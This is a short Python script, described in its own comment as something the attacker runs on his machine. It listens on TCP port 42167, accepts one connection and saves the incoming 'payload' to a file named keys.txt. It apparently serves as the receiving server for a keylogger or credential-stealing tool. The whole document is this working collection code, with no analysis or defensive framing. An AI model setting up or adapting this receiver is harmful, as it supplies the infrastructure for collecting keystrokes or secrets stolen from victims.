# Attacker runs this on his machine.

import socket

s = socket.socket()
host = '0.0.0.0'
port = 42167
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()

filename = 'keys.txt'
file = open(filename, 'wb')
while True:
    try:
        file_data = conn.recv(100)
        # Client closed
        if len(file_data) == 0:
            break
        print('received payload')
        file.write(file_data)
    except Exception as e:
        break;
file.close()
